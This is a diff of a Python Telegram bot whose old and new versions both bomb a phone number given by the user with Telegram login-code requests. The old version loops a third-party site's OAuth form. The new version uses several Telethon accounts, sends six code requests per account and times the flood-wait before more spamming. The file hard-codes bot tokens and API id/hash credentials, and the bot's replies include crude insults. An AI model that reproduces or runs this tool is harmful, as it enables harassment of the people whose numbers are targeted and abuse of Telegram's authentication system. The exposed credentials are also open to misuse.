@@ -1,91 +1,113 @@
 import asyncio
-import aiohttp
 import re
-from urllib.parse import urljoin
-from telegram import Update
-from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
+from telethon import TelegramClient, errors
+from aiogram import Bot, Dispatcher, types
+from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
+from aiogram.filters import Command
+from aiogram import F
 
-BOT_TOKEN = "8830187981:AAGZu4sKhuTpTSI8sPgliF2lvXYJotP1k1s"
+TOKEN = "8978420835:AAHBaPWP0IGX4YHw1qawpE7nCoRXaK4Kxc4"
+ACCOUNTS = [
+    {"api_id": 33788912, "api_hash": "175c63ac822b43d48b32776ee6b82761"},
+    {"api_id": 33590106, "api_hash": "b40ac10586c1d243b6180c7f9a4feff2"},
+    {"api_id": 39934985, "api_hash": "d0ff8b0d846856b0a01a99379b96e9bd"},
+    {"api_id": 7216741, "api_hash": "1e85ff32d1cabb4e6e9537ae2d8218ca"},
+    {"api_id": 31360840, "api_hash": "4279cc0d7ab41331200a13bf61152f4a"},
+    {"api_id": 867055023716, "api_hash": "11dafcdc1514796c867055023716d39a"},
+    {"api_id": 38299331, "api_hash": "fb5e560c3bda2db7541770b2294ee137"}
+]
 
-spam_tasks = {}
+bot = Bot(token=TOKEN)
+dp = Dispatcher()
+user_states = {}
+clients = []
 
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("Отправь номер (например, +380963836766) — бот сам найдёт форму и отправит запрос.")
+async def on_startup():
+    for acc in ACCOUNTS:
+        client = TelegramClient(None, acc["api_id"], acc["api_hash"])
+        await client.start()
+        clients.append(client)
 
-async def stop_spam(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    chat_id = update.effective_chat.id
-    if chat_id in spam_tasks:
-        task = spam_tasks.pop(chat_id)
-        if not task.done():
-            task.cancel()
-            try:
-                await task
-            except asyncio.CancelledError:
-                pass
-        await update.message.reply_text("Остановлено")
-    else:
-        await update.message.reply_text("Нет активного спама")
+async def on_shutdown():
+    for c in clients:
+        await c.disconnect()
 
-async def handle_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    chat_id = update.effective_chat.id
-    if chat_id in spam_tasks:
-        await update.message.reply_text("Уже идёт, останови /stop")
-        return
-    phone = update.message.text.strip()
+def clean_phone(phone):
+    phone = re.sub(r'[^0-9+]', '', phone)
     if not phone.startswith('+'):
-        await update.message.reply_text("Формат: +380...")
+        phone = '+' + phone
+    return phone
+
+async def finish_flood(chat_id, msg_id):
+    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="spam", callback_data="spam")]])
+    await bot.edit_message_text("floodwait zakonchen mochesh dalshe spamit", chat_id, msg_id, reply_markup=kb)
+    if chat_id in user_states:
+        user_states[chat_id]["timer_task"] = None
+
+async def flood_timer(chat_id, msg_id, seconds):
+    remaining = seconds
+    while remaining > 0:
+        await bot.edit_message_text(f"floodwait - {remaining}sekund", chat_id, msg_id)
+        await asyncio.sleep(1)
+        remaining -= 1
+    await finish_flood(chat_id, msg_id)
+
+async def send_codes(chat_id, msg_id, phone):
+    max_flood = 0
+    for client in clients:
+        for _ in range(6):
+            try:
+                await client.send_code_request(phone)
+            except errors.FloodWaitError as e:
+                if e.seconds > max_flood:
+                    max_flood = e.seconds
+            except:
+                pass
+    await bot.edit_message_text("gotovo tvoia mat viebana", chat_id, msg_id)
+    if max_flood > 0:
+        task = asyncio.create_task(flood_timer(chat_id, msg_id, max_flood))
+        if chat_id in user_states:
+            user_states[chat_id]["timer_task"] = task
+    else:
+        await finish_flood(chat_id, msg_id)
+
+@dp.message(Command("start"))
+async def cmd_start(msg: types.Message):
+    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="spam", callback_data="spam")]])
+    sent = await msg.answer("privet ueban chtob spamit nashmi vnizu (spam)", reply_markup=kb)
+    user_states[msg.chat.id] = {"message_id": sent.message_id, "timer_task": None, "waiting_phone": False}
+
+@dp.callback_query(F.data == "spam")
+async def callback_spam(call: types.CallbackQuery):
+    chat_id = call.message.chat.id
+    state = user_states.get(chat_id)
+    if not state:
+        await call.answer()
         return
+    if state.get("timer_task"):
+        state["timer_task"].cancel()
+        state["timer_task"] = None
+    await bot.edit_message_text("napishi nomer", chat_id, state["message_id"])
+    state["waiting_phone"] = True
+    await call.answer()
 
-    await update.message.reply_text(f"Запущено для {phone}")
+@dp.message(F.text)
+async def handle_phone(msg: types.Message):
+    chat_id = msg.chat.id
+    state = user_states.get(chat_id)
+    if not state or not state.get("waiting_phone"):
+        return
+    phone = clean_phone(msg.text)
+    state["waiting_phone"] = False
+    await bot.delete_message(chat_id, msg.message_id)
+    await send_codes(chat_id, state["message_id"], phone)
 
-    async def spam():
-        count = 0
-        base_url = "https://oauth.telegram.org/auth"
-        params = {
-            "bot_id": "1852523856",
-            "origin": "https://cabinet.presscode.app",
-            "embed": "1",
-            "return_to": "https://cabinet.presscode.app/login"
-        }
-        async with aiohttp.ClientSession() as session:
-            while True:
-                try:
-                    async with session.get(base_url, params=params) as resp:
-                        html = await resp.text()
-                    action = "/auth/send"
-                    form_match = re.search(r'<form[^>]*action="([^"]*)"[^>]*>', html, re.IGNORECASE)
-                    if form_match:
-                        action = form_match.group(1)
-                        if not action.startswith('http'):
-                            action = urljoin(base_url, action)
-                    inputs = {}
-                    for inp in re.finditer(r'<input[^>]*name="([^"]*)"[^>]*value="([^"]*)"[^>]*>', html, re.IGNORECASE):
-                        name = inp.group(1)
-                        value = inp.group(2)
-                        if name and name != 'phone':
-                            inputs[name] = value
-                    inputs['phone'] = phone
-                    async with session.post(action, data=inputs) as resp2:
-                        status = resp2.status
-                        text2 = await resp2.text()
-                        count += 1
-                        if status == 200 and ("success" in text2.lower() or "code" in text2.lower() or "sent" in text2.lower()):
-                            await context.bot.send_message(chat_id, f"✅ Уведомление отправлено! Попытка #{count}")
-                        else:
-                            await context.bot.send_message(chat_id, f"Попытка #{count}: {status}, {text2[:40]}")
-                except Exception as e:
-                    await context.bot.send_message(chat_id, f"Ошибка: {str(e)[:30]}")
-                await asyncio.sleep(0.02)
-
-    task = asyncio.create_task(spam())
-    spam_tasks[chat_id] = task
-
-def main():
-    app = Application.builder().token(BOT_TOKEN).build()
-    app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("stop", stop_spam))
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_number))
-    app.run_polling()
+async def main():
+    await on_startup()
+    try:
+        await dp.start_polling(bot)
+    finally:
+        await on_shutdown()
 
 if __name__ == "__main__":
-    main()
+    asyncio.run(main())
